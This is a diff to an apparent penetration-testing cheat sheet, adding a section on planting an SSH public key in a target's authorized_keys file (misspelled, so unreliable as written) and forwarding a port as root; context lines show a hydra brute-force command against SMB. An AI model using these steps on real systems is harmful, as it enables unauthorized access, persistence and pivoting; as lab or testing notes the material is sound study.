@@ -215,6 +215,18 @@ hydra -L username.txt -P password.txt $ip smb -V -f
 
 ### Shell Spawning
 
+### SSH to Forward Port
+```bash
+----host----
+ssh-keygen
+copy content key.pub
+----target----
+echo "key.pub content" > ~/.ssh/authirized_keys
+chmod 600 ~/.ssh/authirized_keys
+----host----
+ssh -i key -L port:127.0.0.1:port root@host
+```
+
 ## Buffer Overflow
 
 windows kernel exploits
@@ -227,3 +239,4 @@ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 s = "Python syntax highlighting"
 print s
 ```
+
